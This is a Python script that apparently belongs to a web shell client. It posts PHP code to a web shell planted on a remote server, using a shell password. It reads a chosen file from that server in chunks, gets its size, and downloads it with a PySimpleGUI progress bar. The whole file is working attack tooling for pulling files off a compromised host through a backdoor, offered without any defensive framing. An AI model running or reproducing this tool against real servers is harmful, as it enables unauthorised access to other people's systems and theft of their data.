import sys
import pyshell
import base64
import requests
import PySimpleGUI as sg

if __name__ == '__main__':
    url = sys.argv[1] 
    shellpass = sys.argv[2]
    current_path = sys.argv[3]
    filename = sys.argv[4]
    ossep = sys.argv[5] 
    code = '''
    function readfile_chunked($filename, $retbytes = TRUE){{
        $file = fopen($filename, "rb" );
        if($file){{
        while (!feof($file)) {{
            $chunk_size = 1024 * 1024 * 10 ; 
            $buffer = @fread($file, $chunk_size);
            echo $buffer;
            ob_flush();
            flush();
        }}       
        fclose($file);
        }}
        else{{echo ("->|0|<-");}}
    }}
    readfile_chunked('{0}');
    '''.format(current_path + ossep + filename)
    req = pyshell.Spider.post2(url,code)
    code = '''
    $fsize = @filesize('{0}');
    echo $fsize;
    '''.format(current_path + ossep + filename)
    filesize = int(pyshell.Spider.post(url,code).decode('utf-8'))
    sg.theme('Dark Teal 10')
    layout = [[sg.Text('Downloading....')],
            [sg.ProgressBar(filesize, orientation='h', size=(40, 10), key='progressbar')],
            [sg.Cancel()]]
    layout2 = [[sg.Text('Download Success!')],[sg.Button('Exit')]]
    window = sg.Window(filename, layout)
    progress_bar = window['progressbar']
    chunk_size = 1024*1024*10
    barlen = 0
    win2 = True
    with open(filename, 'wb') as f:
        for chunk in req.iter_content(chunk_size = chunk_size):
            event, values = window.read(timeout = 0.1)
            if event == 'Cancel'  or event is None:
                win2 = False
                break
            if chunk:
                barlen = barlen + len(chunk)
                progress_bar.UpdateBar(barlen)
                f.write(chunk)
    f.close()
    if(win2):
        window2 = sg.Window("Success",layout2)
        while True:
            event, values = window2.read(timeout = 10)
            if event == 'Exit':
                break 
        window2.close()
    window.close()

